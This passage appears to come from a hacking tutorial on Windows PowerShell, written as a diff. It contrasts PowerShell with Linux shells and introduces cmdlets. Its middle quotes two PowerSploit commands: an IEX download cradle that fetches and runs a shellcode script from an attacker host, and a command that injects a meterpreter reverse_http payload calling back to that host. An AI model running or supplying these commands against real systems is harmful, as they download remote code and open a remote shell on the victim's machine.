@@ -1,0 +1,32 @@
+Windows PowerShell borrows much from the Linux environment including many Linux commands. It also includes the ability to pipe commands and link commands into a script.
+
+ 
+
+With PowerShell capability, Windows becomes a more powerful hacking platform, but until Microsoft makes its source code open source (don't hold your breath), Linux will still be the operating system of choice for hackers.
+
+ 
+
+On the other hand, PowerShell on the target Windows system can be used to exploit or compromise it. For instance, check out my tutorial on using PowerSploit or Metasploit's Web Delivery against Windows systems. Both of make use of the power of PowerShell on the victim's system. For instance, these PowerShell commands were used in the PowerSploit exploit;
+
+ 
+
+ 
+
+PS > IEX(New-Object Net.WebClient).DownloadString ("http://192.168.181.128:8000/CodeExecution/Invoke-Shellcode.ps1 ")
+
+ 
+
+PS > Invoke-Shellcode -Payload windows/meterpreter/reverse_http -lhost 192.168.181.128 -lport 4444 -Force
+
+ 
+
+My point is simply this, Powershell is a great tool for Windows administrators, but adds one more attack vector for the hacker. As a result, you should become familiar with it.
+
+ 
+
+ 
+Cmdlets 
+
+One of the key differences between Windows PowerShell and the BASH shell in Linux is that Microsoft has developed cmdlets (command-lets) for PowerShell. They cmdlets are essentially single commands that accomplish sometimes more complex tasks, similar to functions. These cmdlets take the form of verb-noun, such as "get-help".
+
+      
